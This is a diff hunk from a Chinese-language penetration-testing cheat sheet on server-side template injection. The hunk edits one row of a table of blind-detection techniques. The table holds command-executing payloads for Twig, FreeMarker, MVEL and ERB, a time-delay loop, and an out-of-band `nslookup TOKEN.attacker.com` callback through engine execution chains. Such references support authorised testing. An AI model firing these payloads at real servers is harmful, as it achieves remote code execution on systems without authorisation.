@@ -219,7 +219,7 @@ MVEL（Drools 等规则引擎，无沙箱）：`Runtime.getRuntime().exec("id")`
 |------|------|
 | 布尔 | `(3*4/2)` 正常 vs `3*)2(/4` 报错；`{{(3*4/2)==6}}` vs `==7` |
 | 时间 | Jinja2: `{% for i in range(10000000) %}{% endfor %}`；Twig: `{{['sleep 5']\|map('system')}}`；FreeMarker Execute `sleep 5`；ERB `<%= sleep(5) %>`；延迟 ≥5s 判定 |
-| OOB | `nslookup TOKEN.attacker.com` 经各引擎执行链；Burp Collaborator/interactsh 收 DNS；命中 = 盲 SSTI 且已 RCE |
+| OOB | `nslookup TOKEN.attacker.com` 经各引擎执行链；interactsh 收 DNS 回调；命中 = 盲 SSTI 且已 RCE |
 | 错误 | `${{<%[%'"}}%\.` 强制解析错误 |
 
 ## 8. 后渗透与客户端
